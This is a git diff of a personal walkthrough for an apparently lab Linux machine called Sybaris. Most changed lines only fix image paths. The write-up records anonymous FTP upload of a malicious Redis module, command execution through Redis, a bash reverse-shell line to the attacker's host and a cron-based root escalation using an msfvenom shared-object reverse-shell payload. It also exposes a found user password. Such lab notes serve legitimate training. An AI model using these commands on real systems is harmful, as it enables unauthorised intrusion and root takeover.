@@ -3,7 +3,8 @@ Alias: Sybaris
 Date: {{date}}
 Platform: Linux Box
 Difficulty: Intermediate
-Tags: #anonymousFTPlogin #FTPwriteabledirectory #htlmy #LoginWebPageUserDisclosure #RedisModules-ExecuteCommands #HackTricksLoadRedisModule #AnonymousFTPdirectorylocation
+Tags: #anonymousFTPlogin #FTPwriteabledirectory #htlmy #LoginWebPageUserDisclosure #RedisModules-ExecuteCommands #HackTricksLoadRedisModule #AnonymousFTPdirectorylocation #PasswordSearch/var/www/html/config #SharedObjectsPriviliegeEscalation 
+
 Status: Finished
 IP: 192.168.241.93
 ---
@@ -23,8 +24,7 @@ IP: 192.168.241.93
 - Googled "ld_library_path privilege escalation" and found a website showing to confirm if the binary uses shared objects
 - Confirmed the binary utilizes shared objects and the shared object utils.so was not found in the binary
 - Created a shared object ".so" payload on my kali machine named "utils.so"
-- 
-- Text
+- Set up a penelope listener on my kali machine and uploaded the "utils.so" payload to the "/usr/local/lib/dev" directory and waited a minute for the cronjob to run and received a root shell
 
 ## Improved skills
 - ldd
@@ -163,31 +163,31 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "ftp 192.168.55.93", logged in as anonymous and found writable directory "pub" containing no files:
 
-![](Pasted%20image%2020221109235702.png)
+![](Images/Pasted%20image%2020221109235702.png)
 #anonymousFTPlogin #FTPwriteabledirectory
 
 # Port 80 - Apache httpd 2.4.6
 
 #### -Navigated to the targets website and found the following blog page powered by HTMLY:
 
-![](Pasted%20image%2020221109235857.png)
+![](Images/Pasted%20image%2020221109235857.png)
 #htlmy
 
 #### -Ran feroxbuster "feroxbuster -u http://192.168.241.93 -C 401 403 405 -x php,txt,json,docx" on kali machine and found the following login page:
 
-![](Pasted%20image%2020221110000023.png)
-![](Pasted%20image%2020221110000336.png)
+![](Images/Pasted%20image%2020221110000023.png)
+![](Images/Pasted%20image%2020221110000336.png)
 
 #### -Attempted to login with user "admin" and password "admin". The error message when attempting to login with username admin discloses if it the username provided is found in the database:
 
-![](Pasted%20image%2020221110000432.png)
+![](Images/Pasted%20image%2020221110000432.png)
 #LoginWebPageUserDisclosure
 
 # Port 6379 - Redis
 
 #### Googled redis enumeration and came across hacktricks website and found we should be able to upload a redis module to the ftp server as we have write permissions on directory "pub":
 
-![](Pasted%20image%2020221110000655.png)
+![](Images/Pasted%20image%2020221110000655.png)
 
 ---
 
@@ -198,26 +198,26 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "RedisModules-ExecuteCommands" github website and git cloned the repository in kali machine:
 
-![](Pasted%20image%2020221110000832.png)
+![](Images/Pasted%20image%2020221110000832.png)
 
 #### -Navigated to the repository and typed "make" to create the compiled "module.so":
 
-![](Pasted%20image%2020221110000913.png)
+![](Images/Pasted%20image%2020221110000913.png)
 
-![](Pasted%20image%2020221110000948.png)
+![](Images/Pasted%20image%2020221110000948.png)
 #RedisModules-ExecuteCommands #HackTricksLoadRedisModule
 
 # Port 21 - FTP
 
 #### -Navigated to directory "pub" on ftp server and typed "put module.so" to upload the module to the ftp server:
 
-![](Pasted%20image%2020221110001235.png)
+![](Images/Pasted%20image%2020221110001235.png)
 
 #### -Googled "where is the anonymous ftp directory located" and found the following webpage showing it is located in the path "/var/ftp/pub"
 
-![](Pasted%20image%2020221110001330.png)
+![](Images/Pasted%20image%2020221110001330.png)
 
-![](Pasted%20image%2020221110001600.png)
+![](Images/Pasted%20image%2020221110001600.png)
 
 #AnonymousFTPdirectorylocation
 
@@ -226,14 +226,14 @@ Enumerated top 200 UDP ports:
 #### -Typed "redis-cli -h [target IP]" to connect to Redis
 
 #### -Typed "MODEL LOAD "/var/ftp/pub/module.so" "
-![](Pasted%20image%2020221110134835.png)
+![](Images/Pasted%20image%2020221110134835.png)
 
 #### -Typed "sytem.exec "id" " and found username "pablo"
-![](Pasted%20image%2020221110134928.png)
+![](Images/Pasted%20image%2020221110134928.png)
 
 #### -I then typed " system exec "/bin/bash -i >& /dev/tcp/[kali IP]:6379 0>&1". Then started a penelope listener on my kali machine and received a reverse shell:
 
-![](Pasted%20image%2020221110135022.png)
+![](Images/Pasted%20image%2020221110135022.png)
 
 
 ---
@@ -249,35 +249,35 @@ Enumerated top 200 UDP ports:
 
 #### -Found "pablo.ini" file and read the file wich exposed pablo's password "PostureAlienateArson345":
 
-![](Pasted%20image%2020221110143222.png)
+![](Images/Pasted%20image%2020221110143222.png)
 
 #### -Typed "sudo -l" and found user pablo is unable to utilize sudo 
 
 #### -Ran linpeas.sh and found cronjob "/usr/bin/log-sweeper" binary running as root:
 
-![](Pasted%20image%2020221110143312.png)
+![](Images/Pasted%20image%2020221110143312.png)
 
-![](Pasted%20image%2020221110143558.png)
+![](Images/Pasted%20image%2020221110143558.png)
 
 #### -Googled "ld_library_path privilege escalation" and found the following web page:
 
-![](Pasted%20image%2020221110143638.png)
+![](Images/Pasted%20image%2020221110143638.png)
 
 #### -Per the suggestion I typed "ldd /usr/bin/log-sweeper"  to confirm if the binary uses shared objects:
 
-![](Pasted%20image%2020221110143741.png)
+![](Images/Pasted%20image%2020221110143741.png)
 #SharedObjectsPriviliegeEscalation #PrivilegeEscalation
 
 #### -Per the above output the binary uses shared objects and "utils.so" shared objects file is not found
 
 #### -Attempted to utilize an exploit (and upload it to the writeable /usr/local/lib/dev directory) for the missing shared objects in the library path, found in HackTricks website but was unsuccessful:
 
-![](Pasted%20image%2020221110144101.png)
+![](Images/Pasted%20image%2020221110144101.png)
 
 #### -Googled "msfvenom shared object cheat sheet" and found the following syntax:
 
-![](Pasted%20image%2020221110144231.png)
-![](Pasted%20image%2020221110144301.png)
+![](Images/Pasted%20image%2020221110144231.png)
+![](Images/Pasted%20image%2020221110144301.png)
 
 ---
 
@@ -286,8 +286,8 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.241 LPORT=80 -f elf-so > utils.so" utilizing the above syntax structure found on my kali machine to create the reverse shell payload:
 
-![](Pasted%20image%2020221110144610.png)
+![](Images/Pasted%20image%2020221110144610.png)
 #.soMSFVenomreverseshell #MSFVenom #SharedObjectsPriviliegeEscalation 
 
-![](Pasted%20image%2020221110145310.png)
+![](Images/Pasted%20image%2020221110145310.png)
 ---
